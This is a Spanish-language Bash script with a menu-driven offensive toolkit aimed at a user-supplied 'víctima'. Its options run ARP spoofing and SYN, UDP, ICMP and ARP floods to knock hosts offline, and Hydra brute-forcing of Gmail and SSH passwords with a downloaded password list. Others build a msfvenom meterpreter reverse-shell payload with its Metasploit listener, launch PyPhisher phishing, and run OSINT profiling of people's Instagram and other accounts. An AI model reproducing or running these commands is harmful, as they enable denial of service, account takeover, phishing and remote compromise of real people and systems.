#!/bin/bash

clear;

menu="
 ----------------------------------------------------------
|                  (っ◔◡◔)っ  Menu                         |
|----------------------------------------------------------|
|                         OPCIONES                         |
|----------------------------------------------------------|
|                        UTILIDADES                        |
|----------------------------------------------------------|
| 30 - Salir                                               |
| 29 - Instalar dependencias                               |
|----------------------------------------------------------|
|                   ATAQUES DE RED                         |
|----------------------------------------------------------|
| 28 - Restablecer red                                     |
| 27 - Dejar sin red                                       |
| 26 - Nmap toda la red                                    |
| 25 - ARP Attack                                          |
| 24 - ICMP Attack                                         |
| 23 - UDP Attack                                          |
| 22 - TCP Attack                                          |
|----------------------------------------------------------|
|                  HERRAMIENTAS                            |
|----------------------------------------------------------|
| 21 - Ver S.O de un equipo                                |
| 20 - Sherlock + BlackBird                                |
| 19 - Crear Exploit                                       |
| 18 - Ejecutar Exploit                                    |
| 17 - Añadir contenido a una imagen                       |
| 16 - Mostrar contenido oculto de una imagen              |
| 15 - Fusionar texto a imagen                             |
| 14 - Extraer texto de imagen                             |
| 13 - Ver metadatos de un archivo                         |
| 12 - Cambiar metadato de archivo                         |
| 11 - Borrar metadatos (no borra todos)                   |
|----------------------------------------------------------|
|                  ATAQUES DE CONTRASEÑA                   |
|----------------------------------------------------------|
| 10 - Hydra GMAIL                                         |
|  9 - SSH DirectAT                                        |
|  8 - Hydra SSH                                           |
|----------------------------------------------------------|
|                  OSINT (INTELIGENCIA ABIERTA)            |
|----------------------------------------------------------|
|  7 - OSINT Instagram                                     |
|  6 - OSINT Install                                       |
|----------------------------------------------------------|
|                  PHISHING                                |
|----------------------------------------------------------|
|  5 - Phishing                                            | 
|----------------------------------------------------------|
|                  OTRAS OPCIONES                          |
|----------------------------------------------------------|
|  4 - Opción 4                                            |
|  3 - Opción 3                                            |
|  2 - Opción 2                                            |
|  1 - Opción 1                                            |
|  0 - Salir                                               |
 ----------------------------------------------------------
"

for ((i = 0; i < ${#menu}; i++)); do
    echo -n "${menu:$i:1}"
    sleep 0.01
done

while [ opcion!=0 ]
do
    clear;

    echo " ";
    echo " ----------------------------------------------------------";
    echo "|                  (っ◔◡◔)っ  Menu                         |";
    echo "|----------------------------------------------------------|";
    echo "|                         OPCIONES                         |";
    echo "|----------------------------------------------------------|";
    echo "|                        UTILIDADES                        |";    
    echo "|----------------------------------------------------------|";
    echo "| 30 - Salir                                               |";    
    echo "| 29 - Instalar dependencias                               |";
    echo "|----------------------------------------------------------|";
    echo "|                   ATAQUES DE RED                         |";
    echo "|----------------------------------------------------------|";
    echo "| 28 - Restablecer red                                     |";
    echo "| 27 - Dejar sin red                                       |";
    echo "| 26 - Nmap toda la red                                    |";
    echo "| 25 - ARP Attack                                          |";
    echo "| 24 - ICMP Attack                                         |";
    echo "| 23 - UDP Attack                                          |";
    echo "| 22 - TCP Attack                                          |";
    echo "|----------------------------------------------------------|";
    echo "|                  HERRAMIENTAS                            |";
    echo "|----------------------------------------------------------|";
    echo "| 21 - Ver S.O de un equipo                                |";
    echo "| 20 - Sherlock + BlackBird                                |";
    echo "| 19 - Crear Exploit                                       |";
    echo "| 18 - Ejecutar Exploit                                    |";
    echo "| 17 - Añadir contenido a una imagen                       |";
    echo "| 16 - Mostrar contenido oculto de una imagen              |";
    echo "| 15 - Fusionar texto a imagen                             |";
    echo "| 14 - Extraer texto de imagen                             |";
    echo "| 13 - Ver metadatos de un archivo                         |";
    echo "| 12 - Cambiar metadato de archivo                         |";
    echo "| 11 - Borrar metadatos (no borra todos)                   |";
    echo "|----------------------------------------------------------|";
    echo "|                  ATAQUES DE CONTRASEÑA                   |";
    echo "|----------------------------------------------------------|";
    echo "| 10 - Hydra GMAIL                                         |";
    echo "|  9 - SSH DirectAT                                        |";
    echo "|  8 - Hydra SSH                                           |";
    echo "|----------------------------------------------------------|";
    echo "|                  OSINT (INTELIGENCIA ABIERTA)            |";
    echo "|----------------------------------------------------------|";
    echo "|  7 - OSINT Instagram                                     |";
    echo "|  6 - OSINT Install                                       |";
    echo "|----------------------------------------------------------|";
    echo "|                  PHISHING                                |";
    echo "|----------------------------------------------------------|";
    echo "|  5 - Phishing                                            |"; 
    echo "|----------------------------------------------------------|";
    echo "|                  OTRAS OPCIONES                          |";
    echo "|----------------------------------------------------------|";
    echo "|  4 - Opción 4                                            |";
    echo "|  3 - Opción 3                                            |";
    echo "|  2 - Opción 2                                            |";
    echo "|  1 - Opción 1                                            |";
    echo "|  0 - Salir                                               |";
    echo " ----------------------------------------------------------";

    read -p "Escoge opción: " opcion;

    case $opcion in

        29)
        # Instalar dependencias
        echo "Actualizando librerías..."
        sleep 2
        sudo apt update

        echo "Instalando herramientas de seguridad..."
        sleep 2
        sudo apt install --yes metasploit-framework
        sudo snap install metasploit-framework
        sudo apt install --yes hydra
        sudo apt install --yes nmap
        sudo apt install --yes dsniff
        sudo apt install --yes ssh
        sudo apt install --yes nftables 
        sudo apt install --yes libimage-exiftool-perl
        sudo apt install --yes hping3

        echo "Instalando herramientas de OSINT..."
        sleep 2
        sudo apt install --yes python3-pip
        sudo apt install --yes python3-pandas
        sudo apt install --yes python3-requests-futures
        sudo apt install --yes python3-torrequest
        git clone https://github.com/sherlock-project/sherlock.git
        python3 -m pip install -r sherlock/requirements.txt

        echo "Descargando diccionario..."
        sleep 2
        wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
        mv 10-million-password-list-top-1000000.txt diccionario.txt

        echo "Configurando phishing..."
        sleep 2
        sudo apt install --yes curl
        sudo apt install --yes git python3 php openssh-client -y
        git clone https://github.com/KasRoudra/PyPhisher
        cd PyPhisher
        pip3 install -r files/requirements.txt
        cd ..

        echo "Descargando BlackBird..."
        sleep 3
        git clone https://github.com/p1ngul1n0/blackbird.git
        cd blackbird
        pip3 install -r requirements.txt
        cd ..
        ;;

        28)
        # Restablecer red
        echo "Restableciendo la red..."
        killall arpspoof
        ;;

        27)
        # Dejar sin red
        read -p "Dime la ip de la víctima: " victima
        arpspoof -t $victima 192.168.12.10 2> /dev/null &
        arpspoof -t 192.168.12.10 $victima 2> /dev/null &
        sysctl net.ipv4.ip_forward=1
        nft -f redir80443.txt
        ;;

        26)
        # Nmap toda la red
        read -p "Dime el nombre de la Red: " red
        read -p "Parámetros? (T4,sP): " parametro
        nmap -$parametro $red/24
        sleep 60
        ;;

        25)
        # ARP Attack
        read -p "Dime la ip de la Víctima: " ip
        nping --arp --rate 3000 -c 100000 $ip
        ;;

        24)
        # ICMP Attack
        read -p "Dime la ip de la Víctima: " ip
        sudo ping -f $ip
        ;;

        23)
        # UDP Attack
        read -p "Dime la ip de la Víctima: " ip
        nping --udp --flags syn --rate 3000 -c 100000 $ip
        ;;

        22)
        # TCP Attack
        read -p "Dime la ip de la Víctima: "  ip
        nping --tcp --flags syn --rate 3000 -c 100000 $ip
        ;;

        21)
        # Ver S.O de un equipo
        read -p "Dime el equipo que quieres comprobar: " eq
        nmap -T4 -O $eq
        ;;

        20)
        # Sherlock + BlackBird
        read -p "Dime el usuario que quieres investigar: " usr
        cd sherlock
        python3 sherlock $usr
        sleep 5
        cd ..
        cd blackbird
        python3 blackbird.py -u $usr
        cd ..
        sleep 60
        ;;

        19)
        # Crear Exploit
        read -p "Dime cómo quieres que se llame el exploit: " exp
        read -p "Dime tu IP: " ip
        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip -f elf -o ~/$exp
        ;;

        18)
        # Ejecutar Exploit
        read -p "Dime tu dirección IP: " ip
        echo "use exploit/multi/handler" > exploit.rc
        echo "set PAYLOAD linux/x64/meterpreter/reverse_tcp" >> exploit.rc
        echo "set LHOST $ip" >> exploit.rc
        echo "run" >> exploit.rc
        msfconsole -q -r exploit.rc
        ;;

        17)
        # Añadir contenido a una imagen
        read -p "Dime el texto que quieres meter en una imagen: " texto
        read -p "Dime el nombre de la imagen: " nimagen
        read -p "Dime el nombre de la imagen Final: " fimagen
        echo "$texto" > .topsecret.txt && cat $nimagen .topsecret.txt > $fimagen
        ;;

        16)
        # Mostrar contenido oculto de una imagen
        read -p "Dime nombre de la imagen: " img
        strings $img    
        sleep 10
        ;;

        15)
        # Fusionar texto a imagen
        read -p "Dime el texto que quieres meter en una imagen: " texto
        read -p "Dime el nombre de la imagen: " nimagen
        read -p "Dime el nombre del archivo oculto O si el nombre de uno que quieras utilizar: " arch
        echo $texto > $arch 
        steghide embed -ef $arch -cf $nimagen
        ;;

        14)
        # Extraer texto de imagen
        read -p "Dime nombre del archivo: " img
        steghide extract -sf $img       
        sleep 5
        ;;

        13)
        # Ver metadatos de un archivo
        read -p "Dime nombre del archivo: " img
        exiftool -s $img
        sleep 10
        ;;

        12)
        # Cambiar metadato de archivo
        read -p "Dime nombre del archivo: " arch
        read -p "Dime el nombre del metadato que quieres modificar: " meta
        read -p "Dime el nuevo valor que quieres añadirle: " valor
        exiftool -$meta=$valor $arch
        ;;

        11)
        # Borrar metadatos (no borra todos)
        read -p "Dime el del archivo: " arch
        exiftool -all= $arch
        ;;

        10)
        # Hydra GMAIL
        read -p "Dime el correo electrónico de la víctima: " visti
        hydra -s 465 -S -v -V -l $visti -P diccionario.txt -e s -f -t 16 smtp.gmail.com smtp
        sleep 20
        ;;

        9)
        # SSH DirectAT
        clear
        read -p "Usuario: " usuario
        read -p "IP: " ip
        hydra -V -f -l $usuario -P diccionario.txt -o results.txt $ip ssh
        ;;

        8)
        # Hydra SSH
        clear
        read -p "Dime la contraseña: " contra
        read -p "Dime el usuario: " usu
        read -p "Dime la IP: " ip
        read -p "Que comando quieres usar: " comand
        watch -n 0.1 sshpass -p $contra ssh -t $usu@$ip " $comand "
        ;;

        7)
        # OSINT Instagram
        read -p "Dime el usuario de la víctima: " urs
        cd Osintgram/
        python3 main.py $urs
        sleep 10
        cd ..
        ;;

        6)
        # OSINT Install
        git clone https://github.com/Datalux/Osintgram.git
        cd Osintgram/
        sudo pip3 install -r requirements.txt
        sleep 5
        clear
        echo "Recuerda ir al directorio Osintgram y ejecutar el comando 'make setup' con la cuenta del bot de Instagram."
        sleep 20
        cd ..
        ;;

        5)
        # Phishing
        python3 PyPhisher/pyphisher.py
        ;;

        4)
        # Opción 4
        echo "Has seleccionado la Opción 4."
        sleep 2
        ;;

        3)
        # Opción 3
        echo "Has seleccionado la Opción 3."
        sleep 2
        ;;

        2)
        # Opción 2
        echo "Has seleccionado la Opción 2."
        sleep 2
        ;;

        1)
        # Opción 1
        echo "Has seleccionado la Opción 1."
        sleep 2
        ;;

        0)
        exit
        ;;
    esac
done
